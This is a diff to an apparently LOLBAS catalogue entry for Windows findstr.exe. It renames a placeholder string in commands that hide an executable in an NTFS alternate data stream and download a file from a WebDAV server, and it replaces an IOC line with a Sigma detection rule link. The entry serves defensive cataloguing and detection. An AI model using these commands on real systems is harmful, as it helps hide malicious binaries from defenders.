@@ -4,15 +4,15 @@ Description:
 Author: 'Oddvar Moe'
 Created: 2018-05-25
 Commands:
-  - Command: findstr /V /L W3AllLov3DonaldTrump c:\ADS\file.exe > c:\ADS\file.txt:file.exe
-    Description: Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.
+  - Command: findstr /V /L W3AllLov3LolBas c:\ADS\file.exe > c:\ADS\file.txt:file.exe
+    Description: Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.
     Usecase: Add a file to an alternate data stream to hide from defensive counter measures
     Category: ADS
     Privileges: User
     MitreID: T1564.004
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
-  - Command: findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.txt:file.exe
-    Description: Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.
+  - Command: findstr /V /L W3AllLov3LolBas \\webdavserver\folder\file.exe > c:\ADS\file.txt:file.exe
+    Description: Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.
     Usecase: Add a file to an alternate data stream from a webdav server to hide from defensive counter measures
     Category: ADS
     Privileges: User
@@ -25,8 +25,8 @@ Commands:
     Privileges: User
     MitreID: T1552.001
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
-  - Command: findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.exe
-    Description: Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is downloaded to the target file.
+  - Command: findstr /V /L W3AllLov3LolBas \\webdavserver\folder\file.exe > c:\ADS\file.exe
+    Description: Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is downloaded to the target file.
     Usecase: Download/Copy file from webdav server
     Category: Download
     Privileges: User
@@ -38,7 +38,7 @@ Full_Path:
 Code_Sample:
 - Code:
 Detection:
- - IOC: findstr.exe should normally not be invoked on a client system
+ - Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_findstr.yml
 Resources:
   - Link: https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/
   - Link: https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
